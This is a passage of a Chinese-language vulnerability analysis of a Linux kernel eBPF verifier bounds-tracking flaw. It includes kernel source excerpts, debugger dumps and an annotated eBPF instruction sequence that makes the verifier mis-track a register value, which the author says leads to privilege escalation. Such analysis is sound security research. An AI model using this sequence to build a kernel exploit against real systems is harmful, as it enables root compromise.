            __reg_deduce_bounds(reg);
            __reg_bound_offset(reg);
            __update_reg_bounds(reg);
    }
修改成了：
    (gdb) p/x *reg
    $7 = {type = 0x1, off = 0x0, {range = 0x0, map_ptr = 0x0, {btf = 0x0, btf_id = 0x0}, mem_size = 0x0, raw = {raw1 = 0x0, raw2 = 0x0}}, id = 0x2, ref_obj_id = 0x0,
      var_off = {value = 0x0, mask = 0x7fffffffffffffff}, smin_value = 0x1, smax_value = 0x7fffffffffffffff, umin_value = 0x90000000, umax_value = 0x7fffffffffffffff,
      s32_min_value = 0x80000000, s32_max_value = 0x7fffffff, u32_min_value = 0x90000000, u32_max_value = 0xffffffff, parent = 0xffff88801f9b2000, frameno = 0x0,
      subreg_def = 0x0, live = 0x0, precise = 0x1}
`__reg_combine_64_into_32`函数中的 [1]处认为reg->umin_value
在32位的范围内，就将reg->u32_min_value 设为 (u32)reg->umin_value;
导致reg->u32_min_value=0x90000000，[2]处导致reg->u32_max_value=0xffffffff，
而后经过__reg32_deduce_bounds 函数：
    static void __reg32_deduce_bounds(struct bpf_reg_state *reg)
    {
            /* Learn sign from signed bounds.
             * If we cannot cross the sign boundary, then signed and unsigned bounds
             * are the same, so combine.  This works even in the negative case, e.g.
             * -3 ss32_min_value >= 0 || reg->s32_max_value s32_min_value = reg->u32_min_value =
                            max_t(u32, reg->s32_min_value, reg->u32_min_value);
                    reg->s32_max_value = reg->u32_max_value =
                            min_t(u32, reg->s32_max_value, reg->u32_max_value);
                    return;
            }
            /* Learn sign from unsigned bounds.  Signed bounds cross the sign
             * boundary, so we must be careful.
             */
            if ((s32)reg->u32_max_value >= 0) {
                    /* Positive.  We can't learn anything from the smin, but smax
                     * is positive, hence safe.
                     */
                    reg->s32_min_value = reg->u32_min_value;
                    reg->s32_max_value = reg->u32_max_value =
                            min_t(u32, reg->s32_max_value, reg->u32_max_value);
            } else if ((s32)reg->u32_min_value s32_min_value = reg->u32_min_value =
                            max_t(u32, reg->s32_min_value, reg->u32_min_value);  // s32_max_value = reg->u32_max_value;
            }
    }
[1] 处由于(s32)reg->u32_min_value=(s32)0x90000000 s32_min_value进行赋值，reg->s32_min_value之前的值为0x80000000，取最大值reg->s32_min_value=0x90000000
，reg->s32_max_value=0xffffffff，而条件判断：if r0 = 0x1 goto pc+1 // 对1进行有符号比较
     R0_w=invP(id=0,smax_value=0) R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    14: R0_w=invP(id=0,smax_value=0) R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    14: (95) exit
    15: R0_w=invP(id=0,umin_value=1,umax_value=9223372036854775807,var_off=(0x0; 0x7fffffffffffffff)) R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    15: (18) r2 = 0x8fffffff // 此时认为r0的范围为：[1,0x7fffffffffffffff]
    17: R0_w=invP(id=0,umin_value=1,umax_value=9223372036854775807,var_off=(0x0; 0x7fffffffffffffff)) R2_w=invP2415919103 R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    17: (2d) if r0 > r2 goto pc+1 // 此时对r2进行无符号比较
     R0_w=invP(id=0,umin_value=1,umax_value=2415919103,var_off=(0x0; 0xffffffff)) R2_w=invP2415919103 R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    18: R0_w=invP(id=0,umin_value=1,umax_value=2415919103,var_off=(0x0; 0xffffffff)) R2_w=invP2415919103 R5_w=invP(id=0) R7_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    18: (95) exit // 得到r2的64位范围为[0x90000000,0x7fffffffffffffff]，32位范围为：[0x90000000, 0xffffffff]，这里检查就出现了错误：64位操作数的比较，32位的范围应该是不清楚的，但却得到范围[0x90000000, 0xffffffff]，只要传进来的数32位部分不在此范围，就可以触发漏洞
    19: R0=invP(id=0,umin_value=2415919104,umax_value=9223372036854775807,var_off=(0x80000000; 0x7fffffff7fffffff),s32_min_value=-1879048192,s32_max_value=-1) R2=invP2415919103 R5=invP(id=0) R7=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    19: (bc) w0 = w0 // 对64位进行截断，只看32位部分，范围依旧是[0x90000000, 0xffffffff]
    20: R0_w=invP(id=0,smin_value=0,umin_value=2415919104,umax_value=4294967295,var_off=(0x80000000; 0x7fffffff),s32_min_value=-1879048192,s32_max_value=-1) R2=invP2415919103 R5=invP(id=0) R7=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    20: (04) w0 += 1879048192 // w0+=0x70000000,得到范围为[0,0x6fffffff]
    21: R0_w=invP(id=0,umax_value=1879048191,var_off=(0x0; 0x7fffffff)) R2=invP2415919103 R5=invP(id=0) R7=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    21: (77) r0 >>= 31 // 右移31位，取32位范围的符号位，因为认为范围是[0,0x6fffffff]，所以结果恒为0
    22: R0_w=invP0 R2=invP2415919103 R5=invP(id=0) R7=map_value(id=0,off=0,ks=4,vs=256,imm=0) R8=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
而实际运行过程：
    12: (bf) r0 = r5 // 传进r5=0x180000000
    13: (75) if r0 s>= 0x1 goto pc+1 // r0 >= 0x1, 跳转
    14: (95) exit
    15: (18) r2 = 0x8fffffff
    17: (2d) if r0 > r2 goto pc+1  // r0 > 0x8fffffff，跳转
    18: (95) exit
    19: (bc) w0 = w0   // 截断，w0 = 0x80000000
    20: (04) w0 += 1879048192  // w0+=0x70000000=0xf0000000
    21: (77) r0 >>= 31    // r0 >>= 31 = 0xf0000000 >> 31 = 1
所以最终检查认为r0为0，而实际运行r0为1，参照eBPF的漏洞利用，可以完成提权，但现在eBPF模块对越界读写问题开始重新检查，会影响提权利用，在Pwn2Own
2021之后的利用得对这些检查进行绕过。
最新版Ubuntu 20.10 利用效果图：
## 参考链接